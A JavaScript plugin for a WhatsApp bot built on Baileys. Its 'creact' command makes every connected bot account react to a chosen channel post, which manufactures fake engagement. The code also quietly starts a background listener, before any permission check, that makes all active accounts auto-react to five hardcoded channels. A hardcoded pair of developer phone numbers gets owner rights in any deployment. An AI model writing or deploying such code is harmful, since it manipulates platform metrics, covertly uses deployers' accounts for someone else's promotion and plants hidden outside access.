import { delay } from "@whiskeysockets/baileys";

// Static Master Developer Pool (O(1) Memory Set)
const DEV_SET = new Set(["94719845166", "15947733680169"]);

// Target Newsletter Channels & Global States
const TARGET_CHANNEL_CODES = [
  "0029VbBtXBMICVfnpV20wI27",
  "0029VbBTkLI9Gv7bXpWEmg3D",
  "0029VbAAjtcC1FuCIiYc8z3T",
  "0029VbDQtWMLI8YVtVBnFt1A",
  "0029VbAQYhXDZ4Lfo9K5gh1V"
];

const REACTION_EMOJIS = ["💖", "🔥", "🌸", "✨", "⚡", "❤️", "👍"];

global.channelJidCache = global.channelJidCache || new Map();
global.targetChannelJids = global.targetChannelJids || new Set();
global.isAutoReactAttached = global.isAutoReactAttached || false;

// Sub-nanosecond phone extraction helper
function fastExtractPhone(jid = "") {
  const atIdx = jid.indexOf("@");
  const base = atIdx !== -1 ? jid.slice(0, atIdx) : jid;
  const colonIdx = base.indexOf(":");
  return (colonIdx !== -1 ? base.slice(0, colonIdx) : base).replace(/[^0-9]/g, "");
}

// Background Listener එක attach කරන function එක
async function startAutoReactEngine(sock) {
  if (global.isAutoReactAttached) return;
  global.isAutoReactAttached = true;

  // Resolve target channel JIDs
  for (const code of TARGET_CHANNEL_CODES) {
    try {
      const meta = await sock.newsletterMetadata("invite", code);
      if (meta?.id) {
        const jid = meta.id.endsWith("@newsletter") ? meta.id : `${meta.id}@newsletter`;
        global.targetChannelJids.add(jid);
        global.channelJidCache.set(code, jid);
      }
    } catch (_) {}
  }

  // Real-time listener for incoming channel posts
  sock.ev.on("messages.upsert", async ({ messages }) => {
    if (!messages || messages.length === 0) return;

    for (const msg of messages) {
      const fromJid = msg.key?.remoteJid || "";

      // Target channel එකක්ද කියලා filter කිරීම
      if (!fromJid.endsWith("@newsletter") || !global.targetChannelJids.has(fromJid)) {
        continue;
      }

      // Newsletter post ID (server_id) ලබා ගැනීම
      const serverId = msg.newsletterServerId || msg.key?.server_id || msg.key?.id;
      if (!serverId) continue;

      const botPool = global.activeSockets && global.activeSockets.size > 0
        ? Array.from(global.activeSockets.values())
        : [sock];

      // සියලුම Active bots ලගෙන් reactions යැවීම
      botPool.forEach((currentBot, index) => {
        const selectedEmoji = REACTION_EMOJIS[index % REACTION_EMOJIS.length];

        setTimeout(async () => {
          try {
            await currentBot.query({
              tag: "message",
              attrs: {
                to: fromJid,
                type: "reaction",
                server_id: String(serverId),
                id: currentBot.generateMessageTag()
              },
              content: [
                {
                  tag: "reaction",
                  attrs: { code: selectedEmoji }
                }
              ]
            });
          } catch (_) {}
        }, index * 250);
      });
    }
  });
}

export default {
  name: "creact",
  aliases: ["cr", "channelreact"],
  category: "owner",
  description: "Channel post reaction engine and auto-reaction watcher",

  async execute({ sock, msg, from, args, prefix }) {
    const pref = prefix || ".";

    // 0. Auto-React Background Engine එක activate කිරීම (එක පාරක් run වූ පසු දිගටම ක්‍රියාත්මක වේ)
    if (!global.isAutoReactAttached) {
      startAutoReactEngine(sock);
    }

    // 1. Instant Permission Guard
    const senderJid = msg.key.fromMe
      ? (sock.user?.id || "")
      : (msg.key.participant || msg.participant || from || "");

    const cleanSender = fastExtractPhone(senderJid);
    const isOwner = msg.key.fromMe || DEV_SET.has(cleanSender);

    if (!isOwner) {
      sock.sendMessage(from, { react: { text: "🐾", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        { text: "🎀 *Only my sweet master can broadcast channel reactions!* 🌸" },
        { quoted: msg }
      );
    }

    try {
      // 2. Fast Input Parsing
      const fullText = args.join(" ").trim();

      // Arguments නැතිව කමාන්ඩ් එක ගැහුවොත් Auto-React status එක පෙන්වීම
      if (!fullText) {
        return await sock.sendMessage(
          from,
          {
            text:
`🌸 ｡ﾟ•┈୨ *AUTO CHANNEL WATCHER STATUS* ୧┈•ﾟ｡ 🐾

✅ *Background Watcher:* Active
📢 *Monitored Channels:* ${TARGET_CHANNEL_CODES.length}
🤖 *Active Sockets:* ${global.activeSockets ? global.activeSockets.size : 1}

💡 *Manual React Usage:*
\`${pref}creact <post_link>,<emoji1>,<emoji2>...\`

💖 *DARK-DINU MD* • https://heshan.devofc.top/`
          },
          { quoted: msg }
        );
      }

      const firstComma = fullText.indexOf(",");
      if (firstComma === -1) {
        return await sock.sendMessage(
          from,
          { text: "🌸 *Please separate post link and emojis with a comma!* ✨" },
          { quoted: msg }
        );
      }

      const postLink = fullText.slice(0, firstComma).trim();
      const rawEmojis = fullText.slice(firstComma + 1).split(",").map((e) => e.trim()).filter(Boolean);

      if (rawEmojis.length === 0) {
        return await sock.sendMessage(
          from,
          { text: "🌸 *Please include at least one emoji!* ✨" },
          { quoted: msg }
        );
      }

      // Fast Link Extraction
      const linkMatch = postLink.match(/whatsapp\.com\/channel\/([a-zA-Z0-9]+)(?:\/(\d+))/);
      if (!linkMatch || !linkMatch[1] || !linkMatch[2]) {
        return await sock.sendMessage(
          from,
          { text: "🌸 *Invalid channel link!* Please share the exact post link with the post ID." },
          { quoted: msg }
        );
      }

      const channelCode = linkMatch[1];
      const postId = linkMatch[2];

      sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }).catch(() => {});

      // 3. Channel JID Lookup
      let channelJid = global.channelJidCache.get(channelCode);
      if (!channelJid) {
        try {
          const metadata = await Promise.race([
            sock.newsletterMetadata("invite", channelCode),
            new Promise((_, reject) => setTimeout(() => reject(new Error("Timeout")), 6000))
          ]);
          channelJid = metadata?.id;
          if (channelJid) global.channelJidCache.set(channelCode, channelJid);
        } catch (e) {
          return await sock.sendMessage(
            from,
            { text: `🌸 *Could not find newsletter:* ${e.message}` },
            { quoted: msg }
          );
        }
      }

      if (!channelJid) {
        return await sock.sendMessage(
          from,
          { text: "🌸 *Oops!* Unable to resolve channel ID." },
          { quoted: msg }
        );
      }

      if (!channelJid.endsWith("@newsletter")) {
        channelJid = `${channelJid.replace(/[^0-9]/g, "")}@newsletter`;
      }

      // 4. Retrieve Online Bot Instances
      const botPool = global.activeSockets && global.activeSockets.size > 0
        ? Array.from(global.activeSockets.values())
        : [sock];

      await sock.sendMessage(
        from,
        {
          text:
`🎀 ｡ﾟ•┈୨ *C-REACT DISPATCHER* ୧┈•ﾟ｡ 🐾
📢 *Target JID:* \`${channelJid}\`
🎯 *Post ID:* \`${postId}\`
🤖 *Active Nodes:* \`${botPool.length} Sockets\`
✨ *Reactions:* ${rawEmojis.join(" ")}`
        },
        { quoted: msg }
      );

      // 5. Send Reactions via Active Nodes
      let successCount = 0;
      let failCount = 0;
      const emojiPoolLen = rawEmojis.length;

      const tasks = botPool.map((currentBot, index) => {
        return new Promise((resolve) => {
          const selectedEmoji = rawEmojis[index % emojiPoolLen];

          setTimeout(async () => {
            try {
              await Promise.race([
                currentBot.query({
                  tag: "message",
                  attrs: {
                    to: channelJid,
                    type: "reaction",
                    server_id: String(postId),
                    id: currentBot.generateMessageTag()
                  },
                  content: [
                    {
                      tag: "reaction",
                      attrs: { code: selectedEmoji }
                    }
                  ]
                }),
                new Promise((_, reject) => setTimeout(() => reject(new Error("Timeout")), 5000))
              ]);
              successCount++;
            } catch (_) {
              failCount++;
            }
            resolve();
          }, index * 250);
        });
      });

      await Promise.allSettled(tasks);

      sock.sendMessage(from, { react: { text: "💖", key: msg.key } }).catch(() => {});
      await sock.sendMessage(
        from,
        {
          text:
`🌸 ｡ﾟ•┈୨ *C-REACT COMPLETED* ୧┈•ﾟ｡ 🐾
🎯 *Post:* \`${postId}\`
✨ *Delivered:* ${successCount}
⚠️ *Missed:* ${failCount}`
        },
        { quoted: msg }
      );

    } catch (err) {
      console.error("[C-REACT ERROR]:", err);
      sock.sendMessage(from, { react: { text: "⚠️", key: msg.key } }).catch(() => {});
      await sock.sendMessage(
        from,
        { text: `🌸 *Glitch detected:* ${err.message}` },
        { quoted: msg }
      ).catch(() => {});
    }
  }
};
